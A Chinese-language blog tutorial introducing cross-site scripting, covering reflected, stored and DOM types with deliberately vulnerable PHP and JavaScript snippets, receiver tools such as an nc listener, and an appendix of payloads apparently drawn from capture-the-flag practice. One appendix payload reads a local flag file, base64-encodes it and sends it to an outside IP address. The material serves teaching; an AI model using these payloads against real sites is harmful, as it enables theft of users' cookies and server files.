---
title: xss简介
date: 2017-09-21 16:24:13
categories: web
tags: xss
---

自从xss被发现之后，OWASP上经常会出现它的身影。一开始xss作为一种攻击方式，应用并不算广。但是随着漏洞利用的深入钻研，安全研究者们逐渐发现xss的危害，特别是在用户授权与管理方面。

国内外各大web安全检测厂商，已经在其产品中加入了xss检查、过滤等功能。

### 1、XSS原理

JavaScript可以用来获取用户的Cookie、改变网页内容、URL跳转。于是，我们就可以从存在XSS漏洞的网站中，盗取用户Cookie、黑掉页面、导航到恶意网站。

通常使用<script src="http://www.secbug.org/x.txt"></script>方式来加载外部脚本，而在x.txt中就存放着攻击者的恶意JavaScript代码，这段代码可能是用来盗取用户的Cookie，也可能是监控键盘记录等恶意行为。

备注：JavaScript加载外部的代码文件可以是任意扩展名(无扩展名也可以)

### 2、XSS类型

#### 2.1 反射型XSS

反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。

XSS的Payload一般是写在URL中，之后设法让被害者点击这个链接。

```php
<?php  
     username = _GET['username'];  
     echo $username;  
?>  
 
利用样例：
http://www.secbug.org/xss.php?username=<script>alert(/xss/)</script>
```

#### 2.2 存储型XSS

存储型XSS又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本。

存储型XSS被服务器端接收并存储，当用户访问该网页时，这段XSS代码被读出来响应给浏览器。

反射型XSS与DOM型XSS都必须依靠用户手动去触发，而存储型XSS却不需要。

测试步骤如下，以留言板为例：

（1）添加正常的留言，使用Firebug快速寻找显示标签

（2）判断内容输出（显示）的地方是在标签内还是在标签属性内，或者在其他地方。如果显示区域不在HTML属性内，则可以直接使用xss代码注入。如果在属性内，需要先闭合标签再写入xss代码。如果不能得知内容输出的具体位置，则可以使用模糊测试方案。

（3）在插入xss payload代码后，重新加载留言页面，xss代码被浏览器执行。

#### 2.3 DOM XSS

DOM的全称为Document Object Model，即文档对象模型。

基于DOM型的XSS是不需要与服务器交互的，它只发生在客户端处理数据阶段。简单理解DOM XSS就是出现在javascript代码中的xss漏洞。

```php
<script>  
var temp = document.URL;//获取URL  
var index = document.URL.indexOf("content=")+4;  
var par = temp.substring(index);  
document.write(decodeURI(par));//输入获取内容  
</script>  

利用样例：
http://www.secbug.org/dom.html?content=<script>alert(/xss/)</script>
```

这种利用也需要受害者点击链接来触发，DOM型XSS是前端代码中存在了漏洞，而反射型是后端代码中存在了漏洞。

反射型和存储型xss是服务器端代码漏洞造成的，payload在响应页面中，在dom xss中，payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。

### 3、利用工具

#### 3.1 xss接收工具

谈到xss的利用工具，这里不得不提到火日大神，其在github上的工具[https://github.com/firesunCN/BlueLotus_XSSReceiver](https://github.com/firesunCN/BlueLotus_XSSReceiver)

这个工具是ctf中xss应用的经典工具



**另外一个工具就是nc**

```shell
$ nc -l -p 8080
GET /1.jpg HTTP/1.1
Host: 10.254.20.127:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh,zh-CN;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

```

当外界请求http://10.254.20.127:8080/1.jpg的时候，就会出现上面的信息。

#### 3.2 xss检测工具

xss检测工具很多，现在xsser、xssf

说真的，两个检测工具不怎么好用，还不如手工呢！

另外就是xssor，可以访问

[https://github.com/evilcos/xssor2](https://github.com/evilcos/xssor2)

[http://xssor.io/](http://xssor.io/)

### 4、附录

xss一般请求方式

```
?evilcode=<script><img src="http://xxxx/xss.jpg"/></script>
```

```
?evalcode=<script>var xmlhttp= new XMLHttpRequest();xmlhttp.open("GET","file:///var/www/html/flag.php",true);xmlhttp.onload = function () {content = btoa(xmlhttp.responseText);window.location.href="http://118.190.78.155:8080/index.php?a="%2bcontent;};xmlhttp.send(null);</script>
```

btoa("str")   ===>  base64加密字符串

atob("ABSCRF==")    ===>  base64解密字符串